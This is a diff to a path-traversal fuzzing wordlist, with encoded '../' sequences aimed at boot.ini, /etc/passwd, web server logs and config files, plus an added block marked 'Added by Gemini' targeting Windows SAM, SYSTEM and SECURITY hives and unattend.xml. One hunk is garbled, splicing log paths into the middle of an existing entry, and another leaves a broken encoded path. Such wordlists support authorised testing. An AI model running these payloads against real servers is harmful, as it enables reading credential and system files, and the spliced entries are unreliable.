@@ -11,7 +11,7 @@ flag.txt
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
-/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%winnt/desktop.ini
 /../../../../../../../../%2A
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
@@ -771,7 +771,14 @@ users/.htpasswd
 /var/www/logs/error.log
 ../../../../../../../var/www/logs/error_log
 ../../../../../../../var/www/logs/error.log
-../../../../../var/www/logs/error_log
+../../../../../var/w/var/log/nginx/error.log
+/var/log/nginx/access.log
+# More Apache/httpd Log variations
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/error_log
+ww/logs/error_log
 ../../../../../var/www/logs/error.log
 /var/www/sitename/htdocs/
 /var/www/vhosts/sitename/httpdocs/.htaccess
@@ -1153,3 +1160,18 @@ wp-admin.php
 /sites/defaults/settings.php
 /phpmyadmin/changelog.php
 web.config
+# Added by Gemini
+# Windows Specific
+C:/Users/Default/NTUSER.DAT
+C:/Windows/Panther/unattend.xml
+C:/Windows/System32/config/SAM
+C:/Windows/System32/config/SYSTEM
+C:/Windows/System32/config/SECURITY
+# Nginx Logs
+/var/log/nginx/error.log
+/var/log/nginx/access.log
+# More Apache/httpd Log variations
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/error_log
